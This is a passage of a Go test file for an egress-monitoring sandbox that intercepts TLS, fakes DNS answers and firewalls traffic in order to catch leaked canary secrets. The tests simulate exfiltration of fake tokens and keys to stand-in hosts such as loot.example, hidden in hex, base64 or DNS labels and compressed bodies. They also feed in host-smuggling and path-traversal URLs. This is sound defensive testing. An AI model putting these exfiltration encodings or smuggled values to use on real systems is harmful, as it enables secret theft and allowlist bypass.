package egress

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"compress/zlib"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/net/dns/dnsmessage"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
)

var testNow = time.Date(2026, 11, 14, 12, 0, 0, 0, time.UTC)

// recorded collects what an Egress observes.
type recorded struct {
	mu   sync.Mutex
	obs  []observed
	more chan struct{}
}

func newRecorded() *recorded {
	return &recorded{more: make(chan struct{}, 1)}
}

type observed struct {
	kind   string
	detail any
}

func (r *recorded) observe(kind string, detail any) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.obs = append(r.obs, observed{kind, detail})
	select {
	case r.more <- struct{}{}:
	default:
	}
}

// observeWithin is how long a test waits for an observation that another
// goroutine records, so one that never comes fails the test well before
// go test's deadline. It guards against a hang, not a slow machine: the
// burst of 600 large packets takes over 6 seconds alone under -race, and
// more while other packages' tests build Go code beside it.
const observeWithin = 60 * time.Second

// waitFor waits until cond holds of what was observed, up to observeWithin.
func (r *recorded) waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	ctx, cancel := context.WithTimeout(t.Context(), observeWithin)
	defer cancel()
	for !cond() {
		select {
		case <-r.more:
		case <-ctx.Done():
			t.Fatalf("no observation came within %v", observeWithin)
		}
	}
}

func (r *recorded) of(kind string) []any {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []any
	for _, o := range r.obs {
		if o.kind == kind {
			out = append(out, o.detail)
		}
	}
	return out
}

func newCA(t *testing.T) *CA {
	t.Helper()
	ca, err := NewCA(func() time.Time { return testNow })
	if err != nil {
		t.Fatal(err)
	}
	return ca
}

// fakeResolver answers allowed names from a table.
type fakeResolver struct {
	addrs map[string][]netip.Addr
	txt   map[string][]string
}

func (f fakeResolver) LookupNetIP(_ context.Context, _, host string) ([]netip.Addr, error) {
	if a, ok := f.addrs[host]; ok {
		return a, nil
	}
	return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
}

func (f fakeResolver) LookupTXT(_ context.Context, name string) ([]string, error) {
	if t, ok := f.txt[name]; ok {
		return t, nil
	}
	return nil, &net.DNSError{Err: "no such host", Name: name, IsNotFound: true}
}

// fakeUpstream stands in for the real hosts allowed requests go to.
type fakeUpstream struct {
	mu  sync.Mutex
	got []string
}

func (f *fakeUpstream) RoundTrip(r *http.Request) (*http.Response, error) {
	body, _ := io.ReadAll(r.Body)
	f.mu.Lock()
	f.got = append(f.got, r.Method+" "+r.URL.String()+" "+string(body))
	f.mu.Unlock()
	return &http.Response{
		StatusCode: http.StatusAccepted,
		Header:     http.Header{"Content-Type": {"text/plain"}},
		Body:       io.NopCloser(strings.NewReader("from the real host")),
		Request:    r,
	}, nil
}

var testCanaries = canary.Set{
	{Kind: canary.GitHubToken, Value: "test-github-token-0123456789"},
	{Kind: canary.SSHPrivateKey, Value: "-----BEGIN OPENSSH PRIVATE KEY-----\ntest-ssh-key-body-0123456789\n-----END OPENSSH PRIVATE KEY-----\n"},
}

func TestEnvPointsEveryClientAtTheProxyAndTrustsTheCA(t *testing.T) {
	trust := Trust{CAFile: "/etc/mcp-customs/ca.pem", BundleFile: "/etc/mcp-customs/ca-bundle.pem"}
	env := Env("127.0.0.1:3128", trust)
	for _, want := range []string{
		"HTTPS_PROXY=http://127.0.0.1:3128",
		"HTTP_PROXY=http://127.0.0.1:3128",
		"https_proxy=http://127.0.0.1:3128",
		"http_proxy=http://127.0.0.1:3128",
		// Go's system pool on Linux, and OpenSSL's.
		"SSL_CERT_FILE=" + trust.BundleFile,
		// Node adds this to its own roots, so it is the CA alone.
		"NODE_EXTRA_CA_CERTS=" + trust.CAFile,
		"REQUESTS_CA_BUNDLE=" + trust.BundleFile,
	} {
		if !slices.Contains(env, want) {
			t.Errorf("Env lacks %s: %v", want, env)
		}
	}
}

func TestWriteTrustWritesTheCertificateAndTheBundleNeverTheKey(t *testing.T) {
	ca := newCA(t)
	root := newCA(t) // stands in for the system's roots
	dir := filepath.Join(t.TempDir(), "trust")
	trust, err := WriteTrust(dir, ca, root.CertPEM())
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Dir(trust.CAFile) != dir || filepath.Dir(trust.BundleFile) != dir {
		t.Errorf("trust = %+v, want both files in %s", trust, dir)
	}
	caFile, err := os.ReadFile(trust.CAFile)
	if err != nil || !bytes.Equal(caFile, ca.CertPEM()) {
		t.Errorf("%s = %q, %v; want the CA's certificate", trust.CAFile, caFile, err)
	}
	bundle, err := os.ReadFile(trust.BundleFile)
	if err != nil {
		t.Fatal(err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(bundle) || !bytes.Contains(bundle, root.CertPEM()) || !bytes.Contains(bundle, ca.CertPEM()) {
		t.Errorf("the bundle holds %q, want the system's roots and the CA", bundle)
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		body, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		for rest := body; len(rest) > 0; {
			var block *pem.Block
			if block, rest = pem.Decode(rest); block == nil {
				break
			}
			if block.Type != "CERTIFICATE" {
				t.Errorf("%s holds a %s block; only certificates may be written", e.Name(), block.Type)
			}
		}
		if bytes.Contains(body, []byte("PRIVATE KEY")) {
			t.Errorf("%s holds a private key", e.Name())
		}
	}
}

func TestWriteTrustRefusesADirectoryOthersCanWrite(t *testing.T) {
	dir := t.TempDir()
	if err := os.Chmod(dir, 0o777); err != nil { //nolint:gosec // the point of the test: a directory anyone can write to
		t.Fatal(err)
	}
	if _, err := WriteTrust(dir, newCA(t), nil); err == nil || !strings.Contains(err.Error(), "writable by it alone") {
		t.Errorf("WriteTrust into a world-writable directory = %v, want it refused", err)
	}
}

// dnsQuery is a query packet for name and type.
func dnsQuery(t *testing.T, name string, typ dnsmessage.Type) []byte {
	t.Helper()
	b := dnsmessage.NewBuilder(nil, dnsmessage.Header{ID: 7, RecursionDesired: true})
	if err := b.StartQuestions(); err != nil {
		t.Fatal(err)
	}
	if err := b.Question(dnsmessage.Question{Name: dnsmessage.MustNewName(name + "."), Type: typ, Class: dnsmessage.ClassINET}); err != nil {
		t.Fatal(err)
	}
	q, err := b.Finish()
	if err != nil {
		t.Fatal(err)
	}
	return q
}

func TestDNSQueriesAreObservedAndUnknownNamesGetFakeTXTAndAAnswers(t *testing.T) {
	for name, tc := range map[string]struct {
		name    string
		typ     dnsmessage.Type
		rcode   dnsmessage.RCode
		answers []string
		faked   bool
	}{
		"an unknown TXT record names a host under its domain": {"_cfg.weather-cfg.example", dnsmessage.TypeTXT, dnsmessage.RCodeSuccess, []string{FakeTXT("_cfg.weather-cfg.example")}, true},
		"an unknown A record points into 198.18.0.0/15":       {"cdn.weather-cfg.example", dnsmessage.TypeA, dnsmessage.RCodeSuccess, []string{FakeAddr("cdn.weather-cfg.example").String()}, true},
		"an unknown AAAA record is empty, so clients use A":   {"cdn.weather-cfg.example", dnsmessage.TypeAAAA, dnsmessage.RCodeSuccess, []string{}, true},
		"an allowed A record is looked up for real":           {"api.weather.example", dnsmessage.TypeA, dnsmessage.RCodeSuccess, []string{"192.0.2.10"}, false},
		"an allowed TXT record is looked up for real":         {"api.weather.example", dnsmessage.TypeTXT, dnsmessage.RCodeSuccess, []string{"v=spf1 -all"}, false},
		"an allowed name that doesn't exist says so":          {"gone.weather.example", dnsmessage.TypeA, dnsmessage.RCodeNameError, []string{}, false},
	} {
		t.Run(name, func(t *testing.T) {
			rec := newRecorded()
			e := New(Config{Resolver: fakeResolver{
				addrs: map[string][]netip.Addr{"api.weather.example": {netip.MustParseAddr("192.0.2.10")}},
				txt:   map[string][]string{"api.weather.example": {"v=spf1 -all"}},
			}, Allow: []string{"api.weather.example", "gone.weather.example"}})
			e.Observe(rec.observe)
			reply, ok := e.answerDNS(dnsQuery(t, tc.name, tc.typ))
			if !ok {
				t.Fatal("no reply")
			}
			var p dnsmessage.Parser
			h, err := p.Start(reply)
			if err != nil {
				t.Fatal(err)
			}
			if err := p.SkipAllQuestions(); err != nil {
				t.Fatal(err)
			}
			got := []string{}
			for {
				a, err := p.Answer()
				if errors.Is(err, dnsmessage.ErrSectionDone) {
					break
				}
				if err != nil {
					t.Fatal(err)
				}
				got = append(got, answerStrings([]dnsmessage.ResourceBody{a.Body})...)
			}
			if h.ID != 7 || !h.Response || h.RCode != tc.rcode || !slices.Equal(got, tc.answers) {
				t.Errorf("reply %+v answers %v, want rcode %v answers %v", h, got, tc.rcode, tc.answers)
			}
			want := DNSDetail{Name: tc.name, Type: strings.TrimPrefix(tc.typ.String(), "Type"), Answers: tc.answers, Faked: tc.faked}
			if obs := rec.of(KindDNS); len(obs) != 1 || !jsonEqual(t, obs[0], want) {
				t.Errorf("dns observations = %+v, want %+v", obs, want)
			}
		})
	}
}

func TestFakeAnswersAreStableAndNameNoRealHost(t *testing.T) {
	if FakeAddr("a.example") != FakeAddr("A.example.") || !fakeNet.Contains(FakeAddr("a.example")) {
		t.Errorf("FakeAddr(a.example) = %v, want the same address each time, inside %v", FakeAddr("a.example"), fakeNet)
	}
	if got := FakeTXT("_cfg.weather-cfg.example"); !strings.HasSuffix(got, ".weather-cfg.example") || got != FakeTXT("_CFG.weather-cfg.example.") {
		t.Errorf("FakeTXT = %q, want a stable host under weather-cfg.example", got)
	}
}

// proxyClient is a client that goes through the proxy at proxyURL and
// trusts ca, as the server under test does.
func proxyClient(proxyURL string, ca *CA) *http.Client {
	u, _ := url.Parse(proxyURL)
	return &http.Client{Transport: &http.Transport{
		Proxy:           http.ProxyURL(u),
		TLSClientConfig: &tls.Config{RootCAs: ca.Pool(), MinVersion: tls.VersionTLS12},
	}}
}

func TestAllowedHostsPassThroughOthersGetAFake200AndBothAreSearchedForCanaries(t *testing.T) {
	ca := newCA(t)
	up := &fakeUpstream{}
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: up, Allow: []string{"api.weather.example"}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	client := proxyClient(proxy.URL, ca)
	key := base64.StdEncoding.EncodeToString([]byte(testCanaries.Get(canary.SSHPrivateKey)))

	for name, tc := range map[string]struct {
		url, body  string
		wantStatus int
		wantBody   string
		want       HTTPDetail
	}{
		"an allowed host over intercepted TLS": {
			"https://api.weather.example/v1/forecast?city=Lisbon", "token=" + testCanaries.Get(canary.GitHubToken),
			http.StatusAccepted, "from the real host",
			HTTPDetail{Method: http.MethodPost, Host: "api.weather.example", Path: "/v1/forecast", Allowed: true, Canaries: []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}}},
		},
		"another host over intercepted TLS gets a fake 200": {
			"https://cdn-1a2b3c.weather-cfg.example/", key,
			http.StatusOK, fakeBody,
			HTTPDetail{Method: http.MethodPost, Host: "cdn-1a2b3c.weather-cfg.example", Path: "/", Allowed: false, Canaries: []findings.Match{
				{Canary: canary.SSHPrivateKey, Encoding: findings.Base64},
				// This key's base64 has no + or /, so it reads as base64url too.
				{Canary: canary.SSHPrivateKey, Encoding: findings.Base64URL},
			}},
		},
		"another host over plain HTTP gets a fake 200": {
			"http://collector.example/c", "nothing secret",
			http.StatusOK, fakeBody,
			HTTPDetail{Method: http.MethodPost, Host: "collector.example", Path: "/c", Allowed: false, Canaries: []findings.Match{}},
		},
	} {
		t.Run(name, func(t *testing.T) {
			before := len(rec.of(KindHTTP))
			req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, tc.url, strings.NewReader(tc.body))
			if err != nil {
				t.Fatal(err)
			}
			resp, err := client.Do(req)
			if err != nil {
				t.Fatal(err)
			}
			body, _ := io.ReadAll(resp.Body)
			_ = resp.Body.Close()
			if resp.StatusCode != tc.wantStatus || string(body) != tc.wantBody {
				t.Errorf("answer = %d %q, want %d %q", resp.StatusCode, body, tc.wantStatus, tc.wantBody)
			}
			obs := rec.of(KindHTTP)[before:]
			if len(obs) != 1 || !jsonEqual(t, obs[0], tc.want) {
				t.Errorf("http observations = %+v, want %+v", obs, tc.want)
			}
		})
	}
	if len(up.got) != 1 || !strings.HasPrefix(up.got[0], "POST https://api.weather.example/v1/forecast?city=Lisbon token=") {
		t.Errorf("the real hosts got %q, want the allowed request only, whole", up.got)
	}
	tunnels := rec.of(KindConnect)
	if len(tunnels) != 2 {
		t.Fatalf("connect observations = %+v, want both tunnels", tunnels)
	}
	for _, c := range tunnels {
		d, ok := c.(ConnectDetail)
		if !ok || d.Via != "proxy" || !d.Intercepted || d.Port != 443 || d.Allowed != (d.Host == "api.weather.example") {
			t.Errorf("tunnel %+v, want intercepted through the proxy on 443, allowed only for the allowed host", d)
		}
	}
}

func TestAllowAddsHostsToTheAllowlist(t *testing.T) {
	e := New(Config{Allow: []string{"registry.npmjs.org"}})
	if got := e.Allow("API.Weather.example.", " "); !slices.Equal(got, []string{"api.weather.example", "registry.npmjs.org"}) {
		t.Errorf("Allow = %v", got)
	}
	if !e.isAllowed("api.weather.example") || e.isAllowed("weather.example") {
		t.Error("hosts must match exactly")
	}
}

func TestAClientThatRefusesTheCAIsRecordedAsNotIntercepted(t *testing.T) {
	ca := newCA(t)
	rec := newRecorded()
	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
	e.Observe(rec.observe)
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	pinned := proxyClient(proxy.URL, newCA(t)) // trusts another CA, as a pinned client would
	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, "https://pinned.example/", http.NoBody)
	if err != nil {
		t.Fatal(err)
	}
	if resp, err := pinned.Do(req); err == nil {
		_ = resp.Body.Close()
		t.Fatal("a client pinned to another CA trusted the proxy")
	}
	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) == 1 })
	if d, ok := rec.of(KindConnect)[0].(ConnectDetail); !ok || d.Host != "pinned.example" || d.Intercepted {
		t.Errorf("connect = %+v, want pinned.example, not intercepted", d)
	}
}

func TestFirewallHoldsTheAccountToTheHarnessPorts(t *testing.T) {
	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444, NFLogGroup: 47}
	rules := make([]string, 0, len(fw.Rules()))
	for _, c := range fw.Rules() {
		rules = append(rules, strings.Join(c, " "))
	}
	for _, want := range []string{
		"iptables -w -t nat -A MCP_CUSTOMS -p udp --dport 53 -j REDIRECT --to-ports 5353",
		"iptables -w -t nat -A MCP_CUSTOMS -p tcp -d 127.0.0.1 --dport 3128 -j RETURN",
		"iptables -w -t nat -A MCP_CUSTOMS -p tcp -j REDIRECT --to-ports 4444",
		"iptables -w -t nat -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
		"iptables -w -t filter -A MCP_CUSTOMS -j NFLOG --nflog-group 47",
		"iptables -w -t filter -A MCP_CUSTOMS -j REJECT",
		"iptables -w -t filter -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
		"ip6tables -w -t filter -A MCP_CUSTOMS -j NFLOG --nflog-group 47",
		"ip6tables -w -t filter -A MCP_CUSTOMS -j REJECT",
		"ip6tables -w -t filter -I OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS",
	} {
		if !slices.Contains(rules, want) {
			t.Errorf("the firewall lacks %q", want)
		}
	}
	for _, table := range []string{"iptables -w -t filter", "ip6tables -w -t filter"} {
		logged := slices.Index(rules, table+" -A MCP_CUSTOMS -j NFLOG --nflog-group 47")
		rejected := slices.Index(rules, table+" -A MCP_CUSTOMS -j REJECT")
		if logged < 0 || logged+1 != rejected {
			t.Errorf("%s: NFLOG at %d, REJECT at %d; every refused packet must be logged just before it is rejected", table, logged, rejected)
		}
	}
	if last := rules[len(rules)-1]; !strings.Contains(last, "-j MCP_CUSTOMS") {
		t.Errorf("the last rule is %q; OUTPUT must jump to the chains only once they are complete", last)
	}
}

func TestFirewallUpTakesItselfDownWhenARuleFails(t *testing.T) {
	fw := Firewall{Chain: "MCP_CUSTOMS", UID: 1000, ProxyPort: 3128, DNSPort: 5353, CatchPort: 4444, NFLogGroup: 47}
	var ran []string
	run := func(_ context.Context, c Command) error {
		ran = append(ran, strings.Join(c, " "))
		if slices.Contains(c, "ip6tables") && slices.Contains(c, "-N") {
			return errors.New("no IPv6 here")
		}
		return nil
	}
	if err := fw.Up(t.Context(), run); err == nil || !strings.Contains(err.Error(), "no IPv6 here") {
		t.Fatalf("Up = %v, want the failing rule's error", err)
	}
	if !slices.Contains(ran, "iptables -w -t nat -D OUTPUT -m owner --uid-owner 1000 -j MCP_CUSTOMS") {
		t.Errorf("after a failed rule, ran %v; want the firewall taken down", ran)
	}
	if err := (Firewall{Chain: "X", ProxyPort: 1, DNSPort: 1, CatchPort: 1, NFLogGroup: 1}).Up(t.Context(), run); err == nil {
		t.Error("a firewall for uid 0 was put up; root's traffic is the harness's own")
	}
	if err := (Firewall{Chain: "X", UID: 1000, ProxyPort: 1, DNSPort: 1, CatchPort: 1}).Up(t.Context(), run); err == nil {
		t.Error("a firewall with no NFLOG group was put up; what it refuses would go unrecorded")
	}
}

func jsonEqual(t *testing.T, got, want any) bool {
	t.Helper()
	a, err := json.Marshal(got)
	if err != nil {
		t.Fatal(err)
	}
	b, err := json.Marshal(want)
	if err != nil {
		t.Fatal(err)
	}
	return bytes.Equal(a, b)
}

func TestDNSNamesAreSearchedForCanariesInTheCaseTheyWereSent(t *testing.T) {
	token := testCanaries.Get(canary.GitHubToken)
	label := base64.RawURLEncoding.EncodeToString([]byte(token))
	rec := newRecorded()
	e := New(Config{Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	if _, ok := e.answerDNS(dnsQuery(t, label+".loot.example", dnsmessage.TypeTXT)); !ok {
		t.Fatal("no reply")
	}
	d, _ := rec.of(KindDNS)[0].(DNSDetail)
	if !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Base64URL}) {
		t.Errorf("canaries in a base64url label = %+v, want the token", d.Canaries)
	}
	if d.Name != strings.ToLower(label)+".loot.example" {
		t.Errorf("name = %q; the allowlist and fakes still see it lowercased", d.Name)
	}
}

func TestDNSNamesAreSearchedForCanaries(t *testing.T) {
	token := testCanaries.Get(canary.GitHubToken)
	h := hex.EncodeToString([]byte(token))
	// A hex label is at most 63 characters, so the key is spread over two.
	name := h[:40] + "." + h[40:] + ".loot.example"
	rec := newRecorded()
	e := New(Config{Resolver: fakeResolver{}})
	e.Observe(rec.observe)
	e.SetCanaries(testCanaries)
	if _, ok := e.answerDNS(dnsQuery(t, name, dnsmessage.TypeA)); !ok {
		t.Fatal("no reply")
	}
	obs := rec.of(KindDNS)
	if len(obs) != 1 {
		t.Fatalf("dns observations = %+v", obs)
	}
	d, _ := obs[0].(DNSDetail)
	if !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Hex}) {
		t.Errorf("canaries in %s = %+v, want the token, hex", name, d.Canaries)
	}
}

// post sends body through the proxy to target with headers, and answers what
// the proxy recorded of it.
func post(t *testing.T, e *Egress, ca *CA, target string, body []byte, header http.Header) HTTPDetail {
	t.Helper()
	rec := newRecorded()
	e.Observe(rec.observe)
	proxy := httptest.NewServer(e.Proxy())
	t.Cleanup(proxy.Close)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, target, bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range header {
		req.Header[k] = v
	}
	resp, err := proxyClient(proxy.URL, ca).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	obs := rec.of(KindHTTP)
	if len(obs) != 1 {
		t.Fatalf("http observations = %+v", obs)
	}
	d, _ := obs[0].(HTTPDetail)
	return d
}

func TestCompressedBodiesAreSearchedDecoded(t *testing.T) {
	key := testCanaries.Get(canary.SSHPrivateKey)
	var gz, zl, raw bytes.Buffer
	for _, w := range []io.WriteCloser{gzip.NewWriter(&gz), zlib.NewWriter(&zl)} {
		_, _ = io.WriteString(w, "key="+key)
		_ = w.Close()
	}
	var twice bytes.Buffer
	outer := gzip.NewWriter(&twice)
	_, _ = outer.Write(gz.Bytes())
	_ = outer.Close()
	fw, _ := flate.NewWriter(&raw, flate.BestSpeed)
	_, _ = io.WriteString(fw, "key="+key)
	_ = fw.Close()
	for name, tc := range map[string]struct {
		encoding []string
		body     []byte
	}{
		"gzip":                         {[]string{"gzip"}, gz.Bytes()},
		"zlib deflate":                 {[]string{"deflate"}, zl.Bytes()},
		"raw deflate":                  {[]string{"deflate"}, raw.Bytes()},
		"gzip twice, on one line":      {[]string{"gzip, gzip"}, twice.Bytes()},
		"gzip twice, on two lines":     {[]string{"gzip", "gzip"}, twice.Bytes()},
		"identity and gzip, two lines": {[]string{"identity", "gzip"}, gz.Bytes()},
	} {
		t.Run(name, func(t *testing.T) {
			ca := newCA(t)
			e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
			e.SetCanaries(testCanaries)
			d := post(t, e, ca, "https://loot.example/", tc.body, http.Header{"Content-Encoding": tc.encoding})
			if !slices.Contains(d.Canaries, findings.Match{Canary: canary.SSHPrivateKey, Encoding: findings.Plain}) || d.Unscanned != "" {
				t.Errorf("a %s body: canaries %+v, unscanned %q; want the key found and the body searched whole", name, d.Canaries, d.Unscanned)
			}
		})
	}
}

func TestBodiesThatCantBeSearchedWholeSaySo(t *testing.T) {
	key := testCanaries.Get(canary.GitHubToken)
	for name, tc := range map[string]struct {
		body     []byte
		encoding string
		want     string
	}{
		"a key after 8 MiB of padding": {append(bytes.Repeat([]byte{' '}, maxScan), key...), "", "over 8 MiB"},
		"brotli":                       {[]byte("\x1b\x00"), "br", `encoding "br"`},
		"gzip that isn't":              {[]byte("not gzip"), "gzip", "could not be decoded"},
		"gzip then brotli":             {[]byte("x"), "gzip, br", `encoding "br"`},
		"five codings":                 {[]byte("x"), "gzip, gzip, gzip, gzip, gzip", "encoded 5 times"},
	} {
		t.Run(name, func(t *testing.T) {
			ca := newCA(t)
			e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
			e.SetCanaries(testCanaries)
			header := http.Header{}
			if tc.encoding != "" {
				header.Set("Content-Encoding", tc.encoding)
			}
			if d := post(t, e, ca, "https://loot.example/", tc.body, header); !strings.Contains(d.Unscanned, tc.want) {
				t.Errorf("unscanned = %q, want it to say %q", d.Unscanned, tc.want)
			}
		})
	}
}

func TestTheRegistriesAreAllowedOnlyWhileAnInstallRuns(t *testing.T) {
	e := New(Config{Allow: []string{"api.weather.example"}, InstallAllow: RegistryHosts})
	if e.isAllowed("registry.npmjs.org") {
		t.Error("a registry is allowed before the install")
	}
	e.Installing(true)
	if !e.isAllowed("registry.npmjs.org") || !e.isAllowed("api.weather.example") {
		t.Error("during the install, the registries and the run's hosts must be allowed")
	}
	e.Installing(false)
	if e.isAllowed("proxy.golang.org") || !e.isAllowed("api.weather.example") {
		t.Error("after the install, the registries must not be allowed; the run's hosts still are")
	}
}

func TestAnInstallMayOnlyGetUnderAnInstallGetPrefix(t *testing.T) {
	api := "abc.execute-api.us-east-1.amazonaws.com"
	e := New(Config{InstallAllow: RegistryHosts, InstallGet: []string{"https://" + api + "/goproxy/"}})
	mod := "/goproxy/github.com/!jair!josafath/mcp-customs/demo/mail/@v/list"
	if e.isAllowed(api) || e.requestAllowed(http.MethodGet, api, &url.URL{Path: mod}) {
		t.Error("the demo proxy is reachable before the install")
	}
	e.Installing(true)
	if !e.isAllowed(api) {
		t.Error("during the install, the demo proxy's host must be reachable")
	}
	for name, tc := range map[string]struct {
		method string
		u      url.URL
		want   bool
	}{
		"a GET of a proxy file":        {http.MethodGet, url.URL{Path: mod}, true},
		"a HEAD of a proxy file":       {http.MethodHead, url.URL{Path: mod}, true},
		"a POST to the API":            {http.MethodPost, url.URL{Path: "/api/checks"}, false},
		"a POST under the prefix":      {http.MethodPost, url.URL{Path: mod}, false},
		"a GET of a report":            {http.MethodGet, url.URL{Path: "/api/checks/c1"}, false},
		"a GET climbing out":           {http.MethodGet, url.URL{Path: "/goproxy/../api/checks/c1"}, false},
		"a GET climbing out, escaped":  {http.MethodGet, url.URL{Path: "/goproxy/../api", RawPath: "/goproxy/%2e%2e/api"}, false},
		"the prefix's own name, alone": {http.MethodGet, url.URL{Path: "/goproxyx/a"}, false},
	} {
		if got := e.requestAllowed(tc.method, api, &tc.u); got != tc.want {
			t.Errorf("%s: allowed %v, want %v", name, got, tc.want)
		}
	}
	if !e.requestAllowed(http.MethodPost, "proxy.golang.org", &url.URL{Path: "/x"}) {
		t.Error("a registry is allowed whole during the install")
	}
	e.Installing(false)
	if e.isAllowed(api) || e.requestAllowed(http.MethodGet, api, &url.URL{Path: mod}) {
		t.Error("the demo proxy is reachable after the install")
	}
	e.Installing(true)
	e.Seal()
	if e.isAllowed(api) || e.requestAllowed(http.MethodGet, api, &url.URL{Path: mod}) {
		t.Error("the demo proxy is reachable after the seal")
	}
}

func TestUpstreamURLsAreBuiltFromTheCheckedHostOnly(t *testing.T) {
	u, _ := url.Parse("/simple/x/?a=1")
	for name, tc := range map[string]struct {
		host string
		port int
		want string
		ok   bool
	}{
		"a host and port":  {"pypi.org", 443, "https://pypi.org:443/simple/x/?a=1", true},
		"a host":           {"pypi.org", 0, "https://pypi.org/simple/x/?a=1", true},
		"userinfo":         {"pypi.org@evil.example", 443, "", false},
		"a path in a host": {"pypi.org/evil", 0, "", false},
		"brackets":         {"pypi.org]", 0, "", false},
	} {
		got, err := upstreamURL("https", tc.host, tc.port, u)
		if (err == nil) != tc.ok || got != tc.want {
			t.Errorf("%s: upstreamURL = %q, %v; want %q, ok %v", name, got, err, tc.want, tc.ok)
		}
	}
}

func TestRefusedPacketsAreReadForWhereTheyWereHeaded(t *testing.T) {
	udp4 := []byte{
		0x45, 0, 0, 0, 0, 0, 0, 0, 64, protoUDP, 0, 0, 192, 0, 2, 2, 203, 0, 113, 9,
		0x30, 0x39, 0x27, 0x0f, 0, 13, 0, 0, 'k', '=', 's', 'e', 'c',
	}
	tcp6 := make([]byte, 60)
	tcp6[0], tcp6[6] = 0x60, protoTCP
	copy(tcp6[24:40], netip.MustParseAddr("2001:db8::7").AsSlice())
	tcp6[42], tcp6[43], tcp6[52] = 0x01, 0xbb, 5<<4
	icmp4 := []byte{0x45, 0, 0, 0, 0, 0, 0, 0, 64, protoICMP, 0, 0, 192, 0, 2, 2, 198, 51, 100, 1, 8, 0, 0, 0}
	for name, tc := range map[string]struct {
		packet  []byte
		want    ConnectDetail
		payload string
	}{
		"UDP over IPv4": {udp4, ConnectDetail{Address: "203.0.113.9", Port: 9999, Proto: "udp", Via: "direct", Refused: true}, "k=sec"},
		"TCP over IPv6": {tcp6, ConnectDetail{Address: "2001:db8::7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}, ""},
		"ICMP":          {icmp4, ConnectDetail{Address: "198.51.100.1", Proto: "icmp", Via: "direct", Refused: true}, string(icmp4[20:])},
	} {
		got, payload, ok := refusedPacket(tc.packet)
		if !ok || !jsonEqual(t, got, tc.want) || string(payload) != tc.payload {
			t.Errorf("%s: %+v %q %v, want %+v %q", name, got, payload, ok, tc.want, tc.payload)
		}
	}
	if _, _, ok := refusedPacket([]byte{0x45, 0}); ok {
		t.Error("a cut packet was read")
	}
}

func TestNetlinkMessagesAndAttributesAreSplit(t *testing.T) {
	attrs := append(nla(1, []byte{7}), nla(nfulaPayload, []byte("packet"))...)
	body := append(make([]byte, nfgenmsgLen), attrs...)
	msg := make([]byte, nlmsgHeaderLen, nlmsgHeaderLen+len(body))
	msg = append(msg, body...)
	binary.NativeEndian.PutUint32(msg, uint32(len(msg))) //nolint:gosec // a test message of a few dozen bytes
	binary.NativeEndian.PutUint16(msg[4:], nfnlSubsysULOG<<8|nfulnlMsgPacket)
	msgs := messages(append(msg, msg...))
	if len(msgs) != 2 || msgs[0].kind != nfnlSubsysULOG<<8|nfulnlMsgPacket {
		t.Fatalf("messages = %+v", msgs)
	}
	if got := attribute(msgs[1].body[nfgenmsgLen:], nfulaPayload); string(got) != "packet" {
		t.Errorf("payload = %q", got)
	}
}

func TestDirectTrafficRecordsStopAtTheirBound(t *testing.T) {
	rec := newRecorded()
	e := New(Config{})
	e.Observe(rec.observe)
	for range maxDirect + 5 {
		e.recordDirect(ConnectDetail{Address: "203.0.113.9", Port: 9, Proto: "udp", Via: "direct", Refused: true})
	}
	obs := rec.of(KindConnect)
	if len(obs) != maxDirect {
		t.Fatalf("%d direct observations, want %d", len(obs), maxDirect)
	}
	if last, _ := obs[maxDirect-1].(ConnectDetail); !last.More {
		t.Error("the last recorded must say more were refused unrecorded")
	}
}

func TestARequestWhoseUpstreamCantBeBuiltIsNotSentOn(t *testing.T) {
	for name, hostport := range map[string]string{
		"a port that isn't one names another host": "pypi.org:443.evil.example",
		"a host the URL builder refuses":           "pypi.org@evil.example",
	} {
		t.Run(name, func(t *testing.T) {
			up := &fakeUpstream{}
			rec := newRecorded()
			e := New(Config{Upstream: up, Allow: []string{"pypi.org", "pypi.org@evil.example"}})
			e.Observe(rec.observe)
			w := httptest.NewRecorder()
			e.forward(w, httptest.NewRequestWithContext(t.Context(), http.MethodPost, "/simple/", strings.NewReader("x")), "https", hostport)
			obs := rec.of(KindHTTP)
